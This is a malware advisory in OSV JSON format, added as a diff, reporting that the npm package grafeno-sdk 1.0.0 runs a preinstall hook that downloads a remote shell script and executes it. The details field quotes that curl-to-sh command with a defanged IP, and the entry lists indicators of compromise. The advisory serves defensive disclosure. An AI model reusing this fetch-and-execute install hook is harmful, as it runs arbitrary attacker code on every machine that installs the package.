@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11689",
+  "modified": "2026-08-28T22:47:16Z",
+  "published": "2026-08-28T22:47:03Z",
+  "summary": "Malicious code in grafeno-sdk (npm)",
+  "details": "The package's preinstall hook executes a remote shell script at install time: it runs `curl -s 216[.]126[.]236[.]46/x.sh | sh` via /bin/bash. The package itself contains no functional code (a 39-byte index.js), so its only purpose is to download and execute an arbitrary script from the IP 216[.]126[.]236[.]46 on every install. This is a remote code execution / downloader payload.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "grafeno-sdk",
+        "purl": "pkg:npm/grafeno-sdk"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/grafeno-sdk/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11689"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-28T22:47:03Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "216[.]126[.]236[.]46"
+        ],
+        "sha256": [
+          "27989e79e504099d4824ab81866a7aa94728fa41845a32a3cb941b6cefdeaac5"
+        ],
+        "url_observed": [
+          "hxxp://216[.]126[.]236[.]46/x[.]sh"
+        ]
+      }
+    }
+  }
+}
